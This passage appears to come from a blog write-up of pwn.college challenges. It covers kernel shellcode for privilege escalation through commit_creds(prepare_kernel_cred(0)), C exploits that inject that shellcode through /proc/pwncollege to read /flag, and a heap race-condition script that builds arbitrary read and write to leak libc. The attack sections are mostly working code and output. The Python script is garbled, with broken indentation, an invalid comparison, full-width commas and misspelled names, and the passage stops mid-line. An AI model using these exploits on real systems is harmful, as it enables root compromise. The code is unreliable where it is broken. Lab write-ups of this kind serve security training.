contiguous memory. the details of its argument are waiting to be check.</li><li>when writing to /proc/pwncollege, the device_write() in kernel will call <code>copy_from_user()</code> to copy shellcode from <code>write()</code>‘s buffer argument to <em>shellcode</em> variable. and jmp to shellcode address.</li><li>donot forget to restore kernel’s context after shellcode returns.</li></ul><p>The ciritical point of shellcoding in kernel is we can only call kernel function. here i use <code>prepare_kernel_cred()</code> and <code>commit_cred()</code> to achive privilege escalation.</p><ul><li>two functions’ address:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/kallsyms | grep -E <span class="hljs-string">&#x27;prepare_kernel_cred|commit_cred&#x27;</span></span><br>ffffffff810892c0 T commit_creds                                   <br>ffffffff810895e0 T prepare_kernel_cred                            <br></code></pre></div></td></tr></table></figure><ul><li>then <code>commit_cred(prepare_kernel_cred(0))</code> </li></ul><p>reassembly code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    _copy_from_user ; PIC mode<br>mov     rbp, rax<br>mov     rax, cs:shellcode<br>call    __x86_indirect_thunk_rax ; PIC mode<br><br>mov     rax, rbx<br>pop     rbx<br>sub     rax, rbp<br>pop     rbp<br>retn<br></code></pre></div></td></tr></table></figure><ol><li>what would happen if device_write() return non-zero? first try to non-restore:</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov rbx, 0xffffffff810895e0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rbx, 0xffffffff810892c0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">ret//equals to the ret in device_write()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>The ret instruction equals to the ret in device_write(), and violate the conventions of caller-saved resgiter–rbx. it may crash the kernel. but in practice, it doesn’t.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-comment">//gernerated with pwnsh</span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, shellcode, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>win again.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ ./test                                                                                                        <br>[ 2166.732101] [device_open] inode=ffff888006e33448, file=ffff888006bf7900                                        <br>[ 2166.737393] [device_write] file=ffff888006bf7900, buffer=0000000000481004, length=4096, offset=ffffc900001a7f08<br>pwn_college&#123;what the fuck?&#125;                                                                                       <br>[ 2166.748112] [device_release] inode=ffff888006e33448, file=ffff888006bf7900                                     <br></code></pre></div></td></tr></table></figure><h4 id="level7-5"><a href="#level7-5" class="headerlink" title="level7"></a>level7</h4><p>execute shellcode through ioctl</p><p>after checking the code for a while, I found that it may need to define a struct to wrap up the <em>arg</em> for <code>ioctl()</code>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">device_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">char</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> shellcode_length; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> (*shellcode_execute_addr)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//for canary</span><br>  printk(&amp;unk_A30, file, cmd); <span class="hljs-comment">//nothing</span><br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">1337</span> ) <span class="hljs-comment">//request number must be 1337</span><br>  &#123;<br>    copy_from_user(&amp;shellcode_length, arg, <span class="hljs-number">8LL</span>);<br>    copy_from_user(&amp;shellcode_execute_addr, arg + <span class="hljs-number">4104</span>, <span class="hljs-number">8LL</span>);<br>    <span class="hljs-comment">//the shellcode_length and addr come from the (void*)arg.</span><br>    <span class="hljs-comment">//the maximun len of code is 4104 bytes.</span><br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( shellcode_length &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, arg + <span class="hljs-number">8</span>, shellcode_length);<span class="hljs-comment">//copy shellcode.On success will return 0</span><br>      _x86_indirect_thunk_rax(shellcode_execute_addr);<span class="hljs-comment">// jumpto shellcode.</span><br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the struct may be like:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4104</span>];<br>    <span class="hljs-keyword">void</span>* addr = ?;<br>&#125;test;<br></code></pre></div></td></tr></table></figure><p>code near jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov     rdi, cs:shellcode<br>lea     rsi, [arg+8]<br>call    _copy_from_user ; PIC mode<br>mov     rax, [rsp+28h+shellcode_execute_addr]<br>call    __x86_indirect_thunk_rax ; PIC mode<br>xor     eax, eax<br></code></pre></div></td></tr></table></figure><p><del>so i can reuse the rdi as the shellcode address.</del>. emmmmm, use gdb.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ cat /proc/kallsyms | grep &#x27;device_ioctl&#x27;<br>0xffffffffc000092c t device_ioctl [challenge] <br></code></pre></div></td></tr></table></figure><p>and the kmalloc() address……</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">► <span class="hljs-number">0xffffffffc00009ac</span>    call   _copy_from_user            &lt;_copy_from_user&gt;<br>       rdi: <span class="hljs-number">0xffffc90000045000</span> ◂— <span class="hljs-number">0xffffffffffffffff</span>                       <br>       rsi: <span class="hljs-number">0x4ae388</span> ◂— <span class="hljs-number">0</span>                                                  <br>       rdx: <span class="hljs-number">0x0</span>                                                            <br></code></pre></div></td></tr></table></figure><p>shellcode is same like previous level.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3\x00&quot;</span>;<br><span class="hljs-keyword">int</span> shellcode_len = <span class="hljs-number">25</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4096</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    test.len= shellcode_len;<br>    test.addr = (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0xffffc9000002f000</span>;<br>    <span class="hljs-built_in">memcpy</span>(test.a, shellcode, shellcode_len);<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;test);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>still win. but through a stupid way to find kmalloc()’s fixed address…..</p><h4 id="level8-5"><a href="#level8-5" class="headerlink" title="level8"></a>level8</h4><p>this challenge has two files. One for kernel module, the other for user land program to receive shellcode and add seccomp rules to itself(only write syscall is allowed).</p><p>nothing special.</p><h4 id="level9-5"><a href="#level9-5" class="headerlink" title="level9"></a>level9</h4><p>something strange in IDA…</p><p>Okay, just because the misdecompilation of <code>memset(v8, 0, 66)</code>. in mechine code it is <code>rep stod</code> with rcx=66 rdi=dest rax=content. and it need modify the struct name in Structures window.</p><p>we should fill with this structure, and overwrite the function pointer:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">00000000 logggg          struc ; (sizeof=0x108, align=0x8, copyof_570)<br>00000000                                         ; XREF: device_write/r<br>00000000 buffer          db 256 dup(?)<br>00000100 log_function    dq ?                    ; XREF: device_write+4A/w<br>00000100                                         ; device_write:loc_661/r ; offset<br>00000108 logggg          ends<br>00000108<br></code></pre></div></td></tr></table></figure><p>256 bytes shellcode and 8 bytes shellcode begin address.</p><blockquote><p>ATTENTION:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    __x86_indirect_thunk_rax ; PIC mode<br></code></pre></div></td></tr></table></figure><p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret in the end of it is enough.</p></blockquote><p>this module has local variable space on stack(and canary), so we can use the rdi to restore the stack context and make <code>ret</code> work normally.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//shellcode is also the same.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;...&quot;</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-number">264</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(test.buf, shellcode, <span class="hljs-number">256</span>);<br>    test.addr = (<span class="hljs-keyword">void</span>*)...;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, &amp;test, <span class="hljs-number">264</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="level10-5"><a href="#level10-5" class="headerlink" title="level10"></a>level10</h4><p>I cannt figure out the difference between this and previous level…..</p><h4 id="level11-5"><a href="#level11-5" class="headerlink" title="level11"></a>level11</h4><p>have user land program with seccomp constraint(write). </p><p>and the pwncollege proc <strong>cannt be read</strong> by user:hacker. we can use write to do privilege escalation.</p><h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><p>first fork a child to read the flag into bss segment, then delete the flag.<br>Next read shellcode which can only use write syscall.<br>the shellcode use write() to communicate with pwncollege kernel module for privilege escalation.<br>then use write() to print the bss segment content.</p><h1 id="module-E-advance"><a href="#module-E-advance" class="headerlink" title="module E-advance"></a>module E-advance</h1><h4 id="key-point-1"><a href="#key-point-1" class="headerlink" title="key point:"></a>key point:</h4><ul><li>Core concept: security checks that do not properly use mutexes are ineffective in a multithreaded environment!</li><li>keeps track of what do you know about the process and the program, what do you need to know, what you can do.</li><li><strong>Problem:</strong> we lack knowledge of:<ul><li>PIE base (binary address)</li><li>ASLR base (library addresses)</li><li>Stack base</li><li>Heap base</li><li>Canary</li></ul></li><li>may be a plan:<ol><li>Leak address of tcache_perthread_struct.</li><li>Compute address of pointer to main_arena.</li><li>Leak address of main_arena in libc’s BSS.</li><li> Compute libc base address.</li><li>Compute a thread stack address.</li><li>Leak the canary and overflow the stack or Overwrite the return address with a ropchain!</li></ol></li><li>first: heap base, via tcache poisoning.<ul><li>use race condition showed in the vedio, interleave <code>free</code> with <code>write</code>.</li></ul></li><li>When previous work is done, we get one address in per thread tcache memory. then by gdb it we can find the main_areana pointer in the same memory region. Then we have all threads <strong>heap metadata+libc base address</strong>.</li><li>Exploit Primitives:<ul><li>the building block of complex exploitation:<br>arbitrary read, arbitrary write, arbitrary call. or controlled ones.</li><li>the slides demonstrate an exp example of multithread message storing service.</li><li>use wrapped code for reuse intention.</li><li>some gotchas: <ul><li>corrupted heap metadata: start a new connection</li><li>burned bridges(pointer to not a valid heap chunk): avoid newly non-viable code paths.</li></ul></li></ul></li><li>kernel race:<ul><li>syscalls, file access, interrupts can be triggered simultaneously.</li><li>prevention and recent situation in <a href="https://docs.google.com/presentation/d/16MN3BneO7l16SX_cpvTYlV25nfdRuqfRIRQvV-iURa0/edit#slide=id.gade02eaa21_0_5">SLIDES</a> </li></ul></li></ul><p><b style="color:red">Pivoting Around Memory</b> </p><ul><li>four major parts:<ul><li>The program itself</li><li>The stack</li><li>libc</li><li>The heap</li></ul></li><li>Stack from libc: <code>__libc_argv</code> or <code>environ</code> <ul><li>the <code>environ</code> variable is just a pointer to the env on stack set up by the _start() function(maybe).<br>and the setenv() funtion allocates a chunk on heap for the new string. this function also copies all env strings’ pointer(to stack) to the heap, and add new env pointer to the end of it.lsdfk</li><li>the <code>setenv()</code> copies the string, and the <code>putenv()</code> refers it.</li></ul></li><li>libc from binary: reading GOT entries</li><li>Program base from libc: pivoting through ld<ul><li>libc always contains pointers into <strong>ld</strong> for runtime symbol resolution (in the form of the <strong><code>_dl_runtime_resolve</code></strong> libc GOT entry)</li><li>ld is also practically guaranteed to be at a constant offset from libc</li><li><b>Either way, once the address of ld has been leaked, the <code>name</code> field of the global <code>_dl_rtld_libname</code> struct holds a pointer into the <code>.interp</code> section of the main binary</b> </li></ul></li></ul><img src="../../image/pwn-modules/image-20220621212230967.png" alt="image-20220621212230967" style="zoom:80%;" /><p>e.g.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork() =<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>            <span class="hljs-comment">#这个AAABBB也是细节, 让我纠结到半夜一点多的罪魁祸首.</span><br>            r1.sendline(<span class="hljs-string">&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0&quot;</span>)<br>        os.kill(os.getpid()，<span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        r2.sendline(<span class="hljs-string">&quot;printf 0&quot;</span>)<br>    os.wait()<br>    output = r2.clean()<br>    r1.clean()<br>    leak = pwn.u64(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>，<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br>idx = <span class="hljs-number">1</span><br><span class="hljs-comment">#just as the name, malloc a chunk at the specific address.</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    r1.clean()<br>    r2.clean()<br>    <br>    packed =pwn.p64(addr)<br>    r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&quot;free <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>            os.kill(os.getpid(),<span class="hljs-number">9</span>)<br>r2.send((<span class="hljs-string">b&quot;scanf %d &quot;</span>%idx + packed + <span class="hljs-string">b&quot;\n&quot;</span>)*<span class="hljs-number">2000</span>)<br>         os.wait()<br>         time.sleep(<span class="hljs-number">0.1</span>)<br>         <span class="hljs-comment">#use printf command to check whether the race is win(@packed == content printed out).</span><br>         r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx&#125;</span> printf <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>         r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>         stored = r1.readline()[:-<span class="hljs-number">1</span>]<br>         <span class="hljs-comment">#there maybe an \0 in the address code. if the condition is true, it means the race succeeds.</span><br><span class="hljs-keyword">if</span> stored == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>         <span class="hljs-keyword">break</span><br>r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>r1.clean()<br>idx += <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>r1.sendline(<span class="hljs-string">f&quot;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>    output = r1.readline()[:-<span class="hljs-number">1</span>]<br>    leak = pwn.u64(output[:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>， <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1,，r2，addr , value</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>    r1.send(<span class="hljs-string">b&quot;scanf %d &quot;</span>%(idx-<span class="hljs-number">1</span>) + value + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    p.kill()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br><br>p=pwn.process( <span class="hljs-string">&quot;./ult&quot;</span>)<br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;continue\n&quot;)</span><br><span class="hljs-comment">#time.sleep(1)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/naps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r3 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CONPUTED: MAIN_ARENA_PTR: &quot;</span> , <span class="hljs-built_in">hex</span>(main_arena_ptr_address))<br>main_arena_address = arbitrary_read(r1，r2, main_arena_ptr_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: MAIN_ARENA: &quot;</span>,<span class="hljs-built_in">hex</span>(nain_arena_address))<br>libc_base = main_arena_address - <span class="hljs-number">0x1ebb80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: LIBC_BASE: &quot;</span>, <span 